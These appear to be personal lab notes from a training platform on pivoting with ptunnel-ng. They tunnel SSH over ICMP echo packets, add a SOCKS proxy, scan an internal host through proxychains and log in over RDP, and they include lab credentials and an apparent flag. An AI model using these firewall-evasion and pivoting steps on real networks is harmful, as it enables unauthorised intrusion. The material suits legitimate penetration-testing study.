# ICMP Tunneling with SOCKS

ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses.

Required that ping responses are permitted by Firewall rules

## Setting Up & Using ptunnel-ng

1) Cloning Ptunnel-ng

git clone https://github.com/utoni/ptunnel-ng.git

2) Building Ptunnel-ng with Autogen.sh

cd ptunnel-ng
sudo ./autogen.sh

3) Transferring Ptunnel-ng to the Pivot Host

scp -r ptunnel-ng ubuntu@$TARGET:~/

4) Starting the ptunnel-ng Server on the Target Host

ssh ubuntu@$TARGET
cd ptunnel-ng
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

5) Connecting to ptunnel-ng Server from Attack Host

sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

6) Tunneling an SSH connection through an ICMP Tunnel

ssh -p2222 -lubuntu 127.0.0.1

7) Viewing Tunnel Traffic Statistics

inf]: Incoming tunnel request from 10.10.14.18.
[inf]: Starting new session to 10.129.202.64:22 with ID 20199
[inf]: Received session close from remote peer.
[inf]: 
Session statistics:
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
[inf]: 

8) Enabling Dynamic Port Forwarding over SSH

ssh -D 9050 -p2222 -lubuntu 127.0.0.1

9) Proxychaining through the ICMP Tunnel

proxychains nmap -sV -sT 172.16.5.19 -p3389

10 ) Network Traffic Analysis Considerations

Wireshark

## LAB

10.129.88.4
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo ./autogen.sh
cd ..
scp -r ptunnel-ng ubuntu@$TARGET:~/
HTB_@cademy_stdnt!

ssh ubuntu@$TARGET
HTB_@cademy_stdnt!
cd ptunnel-ng/src
sudo ./ptunnel-ng -r10.129.88.4 -R22
HTB_@cademy_stdnt!


On our attack host :
cd ptunnel-ng/src
sudo ./ptunnel-ng -p10.129.88.4 -l2222 -r10.129.88.4 -R22

ssh -p2222 -lubuntu 127.0.0.1
HTB_@cademy_stdnt!

ssh -D 9050 -p2222 -lubuntu 127.0.0.1
HTB_@cademy_stdnt!

proxychains nmap -sV -sT 172.16.5.19 -p3389

Nmap scan report for 172.16.5.19
Host is up (0.0092s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.35 seconds

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
N3Tw0rkTunnelV1sion!
